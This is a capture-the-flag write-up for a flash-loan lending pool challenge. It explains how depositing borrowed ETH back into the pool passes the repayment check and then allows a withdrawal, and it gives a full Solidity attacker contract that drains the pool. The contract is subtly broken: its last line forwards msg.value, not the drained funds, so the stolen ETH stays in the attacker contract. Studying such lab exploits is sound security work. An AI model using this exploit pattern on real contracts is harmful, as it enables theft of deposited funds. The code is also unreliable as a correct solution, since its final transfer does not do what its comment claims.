# Intro

A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool

# Attack explanation

Our objective is to take the ETH from the lending pool. If we dig the contract, we can find the next functions:

```
function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

In order to beat the level, we need to execute a flashLoan. With that loan, we will deposit the funds inside the loan sc as if they were ours. Then, the flashLoan function will check that the loan has been paid back with address(this).balance. As we redeposited the loan, this control will pass. Then, we will be able to withdraw the deposited funds without problem.

# Attack function

We can create the following attacker contract to make the attack:

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title AttackerContractSideEntrance
 * @author Juan Farber (github.com/Farber98)
 */

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract AttackerContractSideEntrance {
    address public immutable sideEntranceLenderPool;

    constructor(address _sideEntranceLenderPool) {
        sideEntranceLenderPool = _sideEntranceLenderPool;
    }

    // To receive the loan.
    fallback() external payable {}

    function attack() external payable {
        // Calls the loan.
        sideEntranceLenderPool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                address(sideEntranceLenderPool).balance
            )
        );
        // After the loan has been ""repayed"", we will withdraw our funds.
        sideEntranceLenderPool.call(abi.encodeWithSignature("withdraw()"));
        // Transfer funds from this sc to the attacker.
        payable(msg.sender).transfer(msg.value);
    }

    function execute() external payable {
        // With the loan, deposit the funds in our name.
        sideEntranceLenderPool.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
    }
}
```
